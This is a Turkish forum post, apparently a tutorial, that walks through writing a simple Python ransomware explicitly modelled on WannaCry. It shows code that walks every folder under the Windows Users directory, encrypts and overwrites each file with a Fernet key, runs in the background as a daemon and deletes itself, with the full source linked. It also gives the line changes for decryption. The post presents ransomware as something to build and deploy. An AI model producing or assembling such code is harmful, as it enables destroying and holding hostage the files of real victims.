Selamlar



Bu yazıda WannaCry’ın merdiven altı Python fidye yazılımımızı yazacağız .



Kodlara gelmeden evvel nasıl olacağını açıklayalım



os modülü ile bütün alt klasörleri listele
"rb" ile dosyayı aç
cryptography modülü ile içeriği şifrele (kendi şifreleme methodunuzu da kullanabilirsiniz
aynı dosyayı wb ile aç ve şifrelenmiş içeriği içine yaz
[QUOTE]Işte bu kadar basit [/QUOTE]

Gelelim şifrelemenin nasıl yapılacağına



[CODE=python]from cryptography.fernet import Fernet[/CODE]



İle modülümüzü dahil edelim .



Şimdi anahtar eklememiz gerekiyor ;



[CODE=python]anahtar = Fernet.generate_key()[/CODE]



Şimdi fer’e şifrelememizi aktaralım



[CODE=python]fer = Fernet(anahtar)[/CODE]



fer bizim encrpt ve decpyt yapabileceğimiz değerimiz



>> fer.encrypt("Bu yazı şifrelenecek !".encode())



>> b'gAAAAABeigI2PUz7vW4RlT_9peTEtTSgCUs6yypDfsHOgfyPpnfVYOqI7c='



Bu kadar basit aslında işlemimiz ..





Mantığımızı kavradığımıza göre alt klasörleri listeyelim



[CODE=python]import os



for dosya_konum,eleman,dosya_isim_liste in os.walk("\Users"):



    for dosya_isim in dosya_isim_liste:



print(dosya_konum+dosya_isim)[/CODE]



[ICODE]os.walk() Kendisine verilen değerden itirabaren lat klasörleri listeyen oldukça faydalı bir modül

\Users değerini vermemiz ise Tüm Windowslarda Users’ın olması ve tüm kullanıcıları şifrelemek istememiz[/ICODE]



Aşağıdaki kodu çalıştırıp gerçekten de tüm alt klasörleri listeleyeceğini görebilirsiniz





Yapacağımız herşey aslında bu kadardı



Tekrar geçelim;

[QUOTE]

os.walk ile listele
[/QUOTE]

[QUOTE]

listenen dosyaların hepsini wb ile aç , şifrele yaz
[/QUOTE]

Şimdi gelelim asıl kodlarımıza





Görselde bahsettiğim kütüphaneler dışında “daemon” adlı bir modülü daha fark etmişsinizdir



Bu modül sayesinde python kodlarımızı “arkaplanda” çalıştırabileceğiz. | Sadece Gnu-Linux !



os.remove() ‘ı kullanma sebebimiz ise python’un kapandığını sanan hedef programı baştan açmaya çalışacaktır . Bunu dosyayı silerek hallediyoruz



Kaynak Kodları:

Github | YouTube



Not:

Kodları değiştirmeden doğrudan kendi bilgisayarınızda çalıştırırsanız tüm dosyalarınız kullanılamaz hale gelecektir .



Şifrelenmiş dosyayı açmak için kodların 2 parçasını değiştirmek yeterli olacaktır :



[QUOTE]Satır 40 : key = input("key'inizi girin !").encode()[/QUOTE]

[QUOTE]Satır 55 : with open(dosya,"wb") as yaz : yaz.write(fer.decrypt(oku))[/QUOTE]
